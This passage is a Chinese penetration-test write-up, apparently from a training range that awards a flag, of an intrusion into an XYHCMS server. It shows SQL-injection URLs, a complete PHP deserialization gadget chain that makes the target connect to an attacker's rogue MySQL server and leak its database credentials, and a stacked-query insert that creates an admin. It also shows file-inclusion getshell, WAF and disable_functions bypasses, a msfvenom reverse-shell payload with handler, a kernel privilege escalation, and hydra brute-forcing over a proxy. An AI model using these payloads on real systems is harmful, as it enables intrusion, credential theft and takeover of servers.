alt=\"image\"></p>\n<h3 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h3><p>开启伪静态：</p>\n<p><img src=\"f-O0vnvwhniqcVbviV0Zk8EF_yrib_rJn6GCImABAVU.png\" alt=\"image\"></p>\n<p>目前的情况是能够通过反序列化添加管理员进入后台，在本地尝试了多个网上找到的后台getshell都无果，打算开始看看代码有没有新的入口。前面测试写入shell访问的时候，发现会自动加载一会儿，然后跳出404.html页面。</p>\n<p>在后台里面尝试上传的地方，可以添加上传类型txt,html。</p>\n<p>直接查看404.html，查看到嵌入有一些php代码，是获取当前时间的一段代码，也就是说这一个页面极有可能也是可以进行php解析的。</p>\n<p><img src=\"0GsCqcFShva7QmvL2RNG0h6us9HTnuAzEZxy9aeRgnk.png\" alt=\"image\"></p>\n<p>当我尝试改为phpinfo的时候，发现了报错</p>\n<p><img src=\"nqaOpSbz0k2443kllVsDMaymt_GLT7nRQuAoLTz9H08.png\" alt=\"image\"></p>\n<p><img src=\"PFic_qL5EAPqSri-ky1mPd15hIjczPXv593voMBao-Q.png\" alt=\"image\"></p>\n<p>查看了过滤的代码之后，这里过滤了php相关字符的一些危险字符。</p>\n<p><img src=\"N8-whXEcfuPedGBGpLZuaOpBROakgXs9gPf7SyxeCeM.png\" alt=\"image\"></p>\n<p><img src=\"HXlTS7g_bCuW5Y7ViN8w75f9lQpuhHpNFaA76FvBrJk.png\" alt=\"image\"></p>\n<p>这时候尝试通过文件包含的方式去测试，在404.html页面中添加一些语句包含上传的一些代码，尝试解析。</p>\n<p><img src=\"k552jfshUzyTNZKGWI3TWTNlTuA3e6ht9n82PwuqX8Y.png\" alt=\"image\"></p>\n<p><img src=\"8ZKAeFw5nD-b_jmd5S27okLMWTWFcnpaZChBzXFEBLc.png\" alt=\"image\"></p>\n<p>在页面输入一个不存在的文件，尝试访问让其跳转到404.html，然后再包含上传的文件进行解析。</p>\n<p><img src=\"it2DAINURC-mlCZ3V5-y6_UvBnaIjVO3kjeM6BSfbOg.png\" alt=\"image\"></p>\n<p>至此，成功getshell。</p>\n<h1 id=\"外部打点\"><a href=\"#外部打点\" class=\"headerlink\" title=\"外部打点\"></a>外部打点</h1><h2 id=\"SQL注入拿key\"><a href=\"#SQL注入拿key\" class=\"headerlink\" title=\"SQL注入拿key\"></a>SQL注入拿key</h2><p>查询当前key:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//103.121.93.206/index.php/Api/Lt/alist?orderby[updatexml(1,concat(char(126),(select s_value from xyh_config limit 6,1),char(126)),1);]=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"OIsjH26DAQuNhwuKdMt2VeBS0zNvcmMOS1WgIyeJVJQ.png\" alt=\"image\"></p>\n<p>通过日志查看结果：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//103.121.93.206/App/Runtime/Logs/Api/22_05_15.log</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"Ri8oqXFDAYHqHs45rNG6fdPIecZxDlGBhqCA3yKyUBU.png\" alt=\"image\"></p>\n<p>拿到key为：P4tzizR6d</p>\n<h2 id=\"反序列化漏洞利用\"><a href=\"#反序列化漏洞利用\" class=\"headerlink\" title=\"反序列化漏洞利用\"></a>反序列化漏洞利用</h2><p>注册一个会员：</p>\n<p><img src=\"0434TErovOItsmPmfHF-sxPxo-gWTuZ-6ula6ewoftY.png\" alt=\"image\"></p>\n<p><img src=\"SZBzPWuaEwg2KgMJ2DRfUCzUyQr1Z3D8sSosE8wvIDM.png\" alt=\"image\"></p>\n<p>登录之后抓包</p>\n<p><img src=\"WH2mecVyNJbzzoE1zOjrj2Xnblu3c2MXtYVfZG-CU44.png\" alt=\"image\"></p>\n<p>伪造nickname的值</p>\n<p><img src=\"L0WDvpOOl7LFw0pRaueeO3tCs65IYZOetUXuBXRcsC4.png\" alt=\"image\"></p>\n<p><img src=\"kBKVzbAF5OEJ5xMoXEL8CFV0yQagBi7O-yLLsPPctdE.png\" alt=\"image\"></p>\n<h2 id=\"恶意MySQL服务器读取数据库文件-1\"><a href=\"#恶意MySQL服务器读取数据库文件-1\" class=\"headerlink\" title=\"恶意MySQL服务器读取数据库文件\"></a>恶意MySQL服务器读取数据库文件</h2><p>让系统报错，拿到绝对路径：</p>\n<p><code>http://103.121.93.206/App/Api/Conf/config.php</code></p>\n<p>绝对路径：</p>\n<p> <strong>&#x2F;www&#x2F;wwwroot&#x2F;<a href=\"http://www.xycms.com/App/Api/Conf/config.php\">www.xycms.com/App/Api/Conf/config.php</a></strong></p>\n<p><img src=\"rXer-1yIWs82BGv9DM9qQ9AmKh53WyzgVFAUDiasgm8.png\" alt=\"image\"></p>\n<p>查询知道xyhcms的数据库配置文件默认为：xyh.com\\\\App\\\\Common\\\\Conf\\\\db.php</p>\n<p>结合上面知道的绝对路径进行构造：&#x2F;www&#x2F;wwwroot&#x2F;<a href=\"http://www.xycms.com/App/Common/Conf/db.php\">www.xycms.com/App/Common/Conf/db.php</a></p>\n<p><img src=\"cO6t3NlvIIujDXefEUGaNu8WEcOoi2fulIREdXKlslg.png\" alt=\"image\"></p>\n<p>使用poc生成反序列化payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Db</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">PDO</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        PDO::<span class=\"variable constant_\">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">&quot;dsn&quot;</span>    =&gt; <span class=\"string\">&quot;mysql:host=your-vps;dbname=xyhcms;port=3307&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;username&quot;</span> =&gt; <span class=\"string\">&quot;root&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;password&quot;</span> =&gt; <span class=\"string\">&quot;123456&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span>   = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$pk</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$data</span> = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$db</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;db = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Db\\Driver\\Mysql</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;options[<span class=\"string\">&#x27;where&#x27;</span>] = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;pk = <span class=\"string\">&#x27;luoke&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;data[<span class=\"variable language_\">$this</span>-&gt;pk] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">&quot;table&quot;</span> =&gt; <span class=\"string\">&quot;xyh_admin_log&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;where&quot;</span> =&gt; <span class=\"string\">&quot;id=0;&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Session</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Memcache</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$handle</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handle = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Model</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Image</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Imagick</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$img</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;img = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Session\\Driver\\Memcache</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Common</span>\\<span class=\"title class_\">Lib</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SysCrypt</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$crypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_encrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">srand</span>((<span class=\"keyword\">double</span>)<span class=\"title function_ invoke__\">microtime</span>() * <span class=\"number\">1000000</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">0</span>,<span class=\"number\">32000</span>));</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>].(<span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"variable\">$tmp</span>,<span class=\"variable\">$this</span> -&gt; crypt_key));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_decrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$txt</span> = <span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$txt</span>),<span class=\"variable\">$this</span> -&gt; crypt_key);</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$md5</span> = <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>];</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[++<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$md5</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__key</span>(<span class=\"params\"><span class=\"variable\">$txt</span>,<span class=\"variable\">$encrypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$encrypt_key</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"literal\">null</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_cookie</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;P4tzizR6d&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_decrypt</span>(<span class=\"variable\">$name</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">set_cookie</span>(<span class=\"params\"><span class=\"variable\">$args</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;P4tzizR6d&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$args</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_encrypt</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$value</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Image\\Driver\\Imagick</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">set_cookie</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;+&#x27;</span>,<span class=\"string\">&#x27;%2B&#x27;</span>,<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"B8FVni6cWgnLewRSeUdYCcaM_aEAVqOR6re3Waas-YA.png\" alt=\"image\"></p>\n<p>VPS进行监听：</p>\n<p>python rogue_mysql_server.py</p>\n<p><img src=\"oSHhuBG6-zHtCordotB0b1TjS2DjWeQlg4UUUJ27DHg.png\" alt=\"image\"></p>\n<p>发送构造好的payload</p>\n<p><img src=\"XtARS5xrVg26S3AGPxkrRsQ6zsN6pNka9bTyMlqgG4c.png\" alt=\"image\"></p>\n<p>VPS上查看日志：</p>\n<p><img src=\"mv7ty5hN_84pMahlQnrviDZkhn4kupl1XzodsaB_Oj8.png\" alt=\"image\"></p>\n<p>拿到数据库的配置文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;\\x02&lt;?php return array (\\n  &#x27;DB_TYPE&#x27; =&gt; &#x27;mysqli&#x27;,\\n  &#x27;DB_HOST&#x27; =&gt; &#x27;127.0.0.1&#x27;,\\n  &#x27;DB_PORT&#x27; =&gt; &#x27;3306&#x27;,\\n  &#x27;DB_USER&#x27; =&gt; &#x27;root&#x27;,\\n  &#x27;DB_PWD&#x27; =&gt; &#x27;9a973fd7928bb3c2&#x27;,\\n  &#x27;DB_NAME&#x27; =&gt; &#x27;www_xycms_com&#x27;,\\n  &#x27;DB_PREFIX&#x27; =&gt; &#x27;xyh_&#x27;,\\n  &#x27;DB_CHARSET&#x27; =&gt; &#x27;utf8&#x27;,\\n);?&gt;&quot;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"堆叠插入管理员用户\"><a href=\"#堆叠插入管理员用户\" class=\"headerlink\" title=\"堆叠插入管理员用户\"></a>堆叠插入管理员用户</h2><p>账号：sfmtql</p>\n<p>密码：xxxxxx</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;where&quot;</span> =&gt; <span class=\"string\">&quot;id=0;insert into xyh_admin (id,username,password,encrypt,user_type,is_lock,login_num) VALUES (61,&#x27;sfmtql&#x27;,&#x27;d4404a35b6d63a48d3b15f9bb5ffb6ba&#x27;,&#x27;WDdJDu&#x27;,9,0,4);&quot;</span>\u0000</span><br></pre></td></tr></table></figure>\n<h2 id=\"文件包含getshell\"><a href=\"#文件包含getshell\" class=\"headerlink\" title=\"文件包含getshell\"></a>文件包含getshell</h2><p>添加个html</p>\n<p><img src=\"csmEOScQV0feKNYmSbSAmiStrbzRiFitk8A_ii5xlek.png\" alt=\"image\"></p>\n<p>&#x2F;uploads&#x2F;abc1&#x2F;20220522&#x2F;62891648bfa06.html</p>\n<p><img src=\"hLRd5XlYlxBBYGnE5Lwt-oV5WtKvE1C4YDi5SOh44P0.png\" alt=\"image\"></p>\n<p><img src=\"5IWelP2sVKFetOggLmm85OQvRw5VIUCcNl11T1hJLcU.png\" alt=\"image\"></p>\n<p>至此成功getshell</p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><h3 id=\"蚁剑流量绕过宝塔\"><a href=\"#蚁剑流量绕过宝塔\" class=\"headerlink\" title=\"蚁剑流量绕过宝塔\"></a>蚁剑流量绕过宝塔</h3><p>到这里的时候，使用蚁剑连接一直被办，找到了敏感词为“eval”，后面使用了参数污染添加脏数据，当我发包六万多的时候，成功绕过，最后上传一个base64的马进行连接就不会被拦了。</p>\n<h3 id=\"PHP-FPM绕过disable\"><a href=\"#PHP-FPM绕过disable\" class=\"headerlink\" title=\"PHP-FPM绕过disable\"></a>PHP-FPM绕过disable</h3><p>尝试了很多中绕过之后，发现这种方式可以绕过，一天晚上尝试失败了很多次，莫名其妙发现第二天就好了。</p>\n<p>查看fpm的配置文件（&#x2F;www&#x2F;server&#x2F;php&#x2F;56&#x2F;etc&#x2F;php-fpm.conf）可以拿到php-fpm的位置</p>\n<p><img src=\"3RXKfH7Ggq3M4PMlHI8YpbQc0MupqM5LRt_dO7jpHCg.png\" alt=\"image\"></p>\n<p>成功</p>\n<p><img src=\"fGZDrkPNwgfSmUCpEor1cjmyRN610YH_3ueCUQdWa7o.png\" alt=\"image\"></p>\n<p>创建副本之后成功连接。</p>\n<p><img src=\"-PsNJr9G--N4mA2pZjAIEX4UgOLDJz002glz3KrBdwA.png\" alt=\"image\"></p>\n<p>后来觉得中国蚁剑不好用，就改用哥斯拉了。</p>\n<p><img src=\"LkDh5DVi8J-B3exv3wa6L4Ya8opzJP9rbp8H810GvOA.png\" alt=\"image\"></p>\n<p><img src=\"R2CSEktkUv_Yc5Esl-tC71x3bHM88WtQZDZyRKh_Gzg.png\" alt=\"image\"></p>\n<h3 id=\"msf反弹shell\"><a href=\"#msf反弹shell\" class=\"headerlink\" title=\"msf反弹shell\"></a>msf反弹shell</h3><p>生成攻击载荷</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=vps LPORT=<span class=\"number\">4382</span> -f elf &gt;/root/moonsec/<span class=\"number\">2020</span>/project/zhinan</span><br></pre></td></tr></table></figure>\n<p>开始监听</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">multi</span>/<span class=\"title\">handler</span></span><br><span class=\"line\"><span class=\"title\">set</span> <span class=\"title\">payload</span> <span class=\"title\">linux</span>/<span class=\"title\">x86</span>/<span class=\"title\">meterpreter</span>/<span class=\"title\">reverse_tcp</span></span><br><span class=\"line\"><span class=\"title\">set</span> <span class=\"title\">LHOST</span> 192.168.8.133</span><br><span class=\"line\"><span class=\"title\">set</span> <span class=\"title\">lport</span> 13777</span><br><span class=\"line\"><span class=\"title\">run</span></span><br></pre></td></tr></table></figure>\n<p>开启frp映射本地的13777到vps的4382</p>\n<p>将文件上传到添加执行权限，使用哥斯拉执行即可获取到一个session</p>\n<h3 id=\"提权为root\"><a href=\"#提权为root\" class=\"headerlink\" title=\"提权为root\"></a>提权为root</h3><p>通过上传脚本linux-exploit-suggeter.sh执行之后，能查到该服务器的一些基本信息和一些提权的CVE</p>\n<p><img src=\"7iOKc_4gkq980n4NvudBVS1R4nnJt2fTX2RAXmaggV0.png\" alt=\"image\"></p>\n<p>网上搜索了一下18.04 ubuntu的提权，找到了下面的文章</p>\n<p><a href=\"https://blog.csdn.net/gh0stf1re/article/details/116193906\">https://blog.csdn.net/gh0stf1re/article/details/116193906</a></p>\n<p>然后进行上传exp.c编译之后提权</p>\n<p><code>gcc exp.c -o exp</code></p>\n<p><code>./exp</code></p>\n<p><code>sudo su切换到了root</code></p>\n<p><img src=\"3bKhvlYypWqsdO-qoTJdfnvshGWSXMYH3U5IQli6xKA.png\" alt=\"image\"></p>\n<p><img src=\"STVtcNugZ7eAtYa--jHPilUMxNEB-istIuiZKUKw37A.png\" alt=\"image\"></p>\n<p>在根目录获取到了当前的flag</p>\n<p><img src=\"txCZrvymtSdJNKq0o_i9aBq3Z2TDK0xtfbS57YtC9xU.png\" alt=\"image\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">moonsec_flag&#123;moonsec-<span class=\"number\">30</span>db331044bc750a76da6dbf9e2ae190&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"横向移动\"><a href=\"#横向移动\" class=\"headerlink\" title=\"横向移动\"></a>横向移动</h1><h3 id=\"信息收集-1\"><a href=\"#信息收集-1\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><p>cat &#x2F;etc&#x2F;hosts 没发现什么网站</p>\n<p><img src=\"4GZ2YHJxtzYQjitVxWRkxv3c7a32_eDigwzMx2C5SBs.png\" alt=\"image\"></p>\n<p>arp -a 也没发现什么IP</p>\n<p><img src=\"BYCQEOfsdKNaYxc3jrsTq6cvNIxQ97ELS28MWxMU5wI.png\" alt=\"image\"></p>\n<p>metasploit 设置代理进入内网</p>\n<p>run autoroute -s 192.168.52.0&#x2F;24</p>\n<p><img src=\"GeOukDPTulVZ0JpkJan6sQPyrObTEUZ7R1ejZlDY4ms.png\" alt=\"image\"></p>\n<p>启动 socks 模块</p>\n<p>use auxiliary&#x2F;server&#x2F;socks_proxy</p>\n<p>set SRVPORT 22335</p>\n<p>run</p>\n<p><img src=\"D8OlFqtWVDKVzJI1hbIrWNV18lzdA67CpQ0X255JcjU.png\" alt=\"image\"></p>\n<p>发现使用代理扫描太慢了，这就直接在目标安装一个nmap然后进行开扫。</p>\n<p>sudo apt install nmap</p>\n<p><img src=\"OHbsxsWPRDPcX07rVLb8PB5m-TXZhLopv4lKDQIq3PU.png\" alt=\"image\"></p>\n<p>探测到存活的IP：192.168.52.128</p>\n<p><img src=\"I04ti2D6FWvj6EIBgtbY0mhPYwZGOWLptH19lrCbkaY.png\" alt=\"image\"></p>\n<p>扫描端口信息，就只发现了一个1433的mssql端口，没发现web</p>\n<p><img src=\"nu8fs3DYv54nI_vsUquJmZNn56oSd3vhh4LsUxZEOE4.png\" alt=\"image\"></p>\n<p><img src=\"C71x7UxgDlDHLHMyDngbiFLMjQg6zZcANRaFNA7k_4g.png\" alt=\"image\"></p>\n<h3 id=\"hydra爆破sqlserver\"><a href=\"#hydra爆破sqlserver\" class=\"headerlink\" title=\"hydra爆破sqlserver\"></a>hydra爆破sqlserver</h3><p>翻了一圈服务器没找到什么敏感的信息可以利用，只能尝试进行爆破了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains hydra <span class=\"number\">192.168</span>.<span class=\"number\">52.128</span> mssql -l sa  -P /root/moonsec/<span class=\"number\">2020</span>/project11/top1000-moon.txt -vV -f</span><br></pre></td></tr></table></figure>\n<p>运气还是比较好的，爆破出来了</p>\n<p><img src=\"qwoc2No8vTqDMLfk8BUehvdICGy1T-KPzcLSU7ty8to.png\" alt=\"image\"></p>\n<p>使用msf的模块进行攻击之后，发现有些命令不能执行，就只能执行了whoami，不知道是不是msf6的毛病</p>\n<p><img src=\"Jn00cEcF4rNM6lBIxjDN-JlguNcfIqlCT5OttTjovJM.png\" alt=\"image\"></p>\n<h3 id=\"natvicat客户端连接mssql\"><a href=\"#natvicat客户端连接mssql\" class=\"headerlink\" title=\"natvicat客户端连接mssql\"></a>natvicat客户端连接mssql</h3><p>下载natvicat，然后让其走隧道代理去连接目标</p>\n<p><img src=\"9pd4iJnJ7jMQMKLSXfJwTDgbru8y3LAwn7N9FOZoJzw.png\" 